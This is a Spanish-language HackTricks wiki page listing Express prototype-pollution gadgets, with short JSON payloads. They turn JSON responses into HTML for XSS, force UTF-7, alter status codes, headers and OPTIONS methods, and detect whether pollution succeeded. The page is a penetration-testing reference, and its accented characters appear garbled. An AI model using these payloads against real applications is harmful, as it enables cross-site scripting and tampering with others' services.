# Gadgets de Contaminaci칩n de Prototipos de Express

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci칩n**](https://github.com/sponsors/carlospolop)!
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}

## Servir respuestas XSS

**Para m치s detalles** [**echa un vistazo a la investigaci칩n original**](https://portswigger.net/research/server-side-prototype-pollution)

### Cambiar el tipo de contenido JSON a HTML

En una aplicaci칩n Express que utiliza una **respuesta de tipo de contenido JSON** y refleja un JSON:
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
En estos casos, XSS normalmente no es posible con un tipo de contenido JSON. Sin embargo, con la contaminaci칩n de prototipos podemos **confundir a Express para que sirva una respuesta HTML.** Esta vulnerabilidad se basa en que la aplicaci칩n utiliza **`res.send(obj)`** y usa el analizador de cuerpo con el tipo de contenido application/json.
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
Al **contaminar** las propiedades **`body`** y **`_body`**, es posible hacer que **Express sirva el tipo de contenido HTML** y refleje la propiedad `_body`, lo que resulta en XSS almacenado.

### Renderizar UTF7

Es posible hacer que express **renderice contenido UTF-7 con**:
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## T칠cnicas de Escaneo Seguras

### Espacios JSON

El siguiente PP har치 que los atributos dentro de un JSON tengan un espacio extra que no romper치 la funcionalidad:
```json
{"__proto__":{"json spaces": " "}}
```
Entonces un JSON reflejado se ver치 as칤:
```json
{"foo":  "bar"} -- Note the extra space
```
### Exposed Headers

El siguiente gadget de PP har치 que el servidor env칤e de vuelta el encabezado HTTP: **`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
Requiere que el **m칩dulo CORS est칠 instalado**

### **M칠todo OPTIONS**

Con la siguiente carga 칰til, es posible **ocultar un m칠todo de una respuesta OPTIONS**:
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **Estado**

Es posible cambiar el **c칩digo de estado devuelto** utilizando la siguiente carga 칰til de PP:
```json
{"__proto__":{"status":510}}
```
### Error

Cuando asignas a un prototipo con un primitivo como una cadena, produce una **operaci칩n no-op ya que el prototipo tiene que ser un objeto**. Si intentas asignar un objeto prototipo al `Object.prototype` en s칤, esto **lanzar치 una excepci칩n**. Podemos usar estos dos comportamientos para **detectar si la contaminaci칩n del prototipo fue exitosa**:
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### Valor Reflejado

Cuando una aplicaci칩n incluye un objeto en su respuesta, crear un atributo con un **nombre inusual junto a `__proto__`** puede ser revelador. Espec칤ficamente, si **solo se devuelve el atributo inusual** en la respuesta, esto podr칤a indicar la vulnerabilidad de la aplicaci칩n:
```json
{"unusualName":"value","__proto__":"test"}
```
Adem치s, en escenarios donde se emplea una biblioteca como Lodash, establecer una propiedad tanto a trav칠s de la contaminaci칩n del prototipo (PP) como directamente dentro del objeto ofrece otro enfoque de diagn칩stico. Si tal propiedad se omite de la respuesta, sugiere que Lodash est치 verificando la existencia de la propiedad en el objeto objetivo antes de fusionar:
```javascript
{"__proto__":{"a":"value1"},"a":"value2","b":"value3"}
// If 'b' is the only property reflected, this indicates prototype pollution in Lodash
```
## Miscel치neo

### Permitir Puntos

Hay una opci칩n en Express que te permite **crear objetos a partir de par치metros de la cadena de consulta**.\
Definitivamente podr칤as usarlo en una **cadena** de errores para explotar una **vulnerabilidad de contaminaci칩n de prototipos**.
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` crea un objeto en Node.**

## Referencias

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)


{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci칩n**](https://github.com/sponsors/carlospolop)!
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
